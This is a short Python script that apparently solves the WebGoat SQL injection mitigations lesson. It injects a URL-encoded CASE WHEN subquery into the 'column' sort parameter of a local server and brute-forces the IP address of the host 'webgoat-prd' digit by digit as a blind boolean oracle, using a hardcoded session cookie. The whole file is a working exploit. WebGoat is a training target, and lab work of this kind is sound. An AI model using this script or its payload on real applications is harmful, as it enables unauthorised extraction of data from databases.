#!/usr/bin/python3
import requests 
cookies =   {"JSESSIONID":"HNNWV1qYKLaPWCJ-uMgb_OY76ll8QlU4iHiR3ndr"} 

ip = []

for x in range(1,16):
    for y in range(10):
        if x % 4 == 0:
            ip.append('.')    
            break
        else:
            payload = f"%28CASE%20WHEN%20%28%28SELECT%20SUBSTRING%28ip%2C{x}%2C1%29%20FROM%20SERVERS%20WHERE%20hostname%3D%27webgoat-prd%27%29%3D{y}%29%20THEN%20hostname%20else%20id%20end%29"
            re = requests.get(f"http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column={payload}", cookies=cookies);
            json = re.json()
            tru = '3' == json[0]['id']
            if tru:
                print(f"El dígito ip en espacio {x} es {y}")
                ip.append(str(y)) 
print(f"The secret IP is {''.join(ip)}")
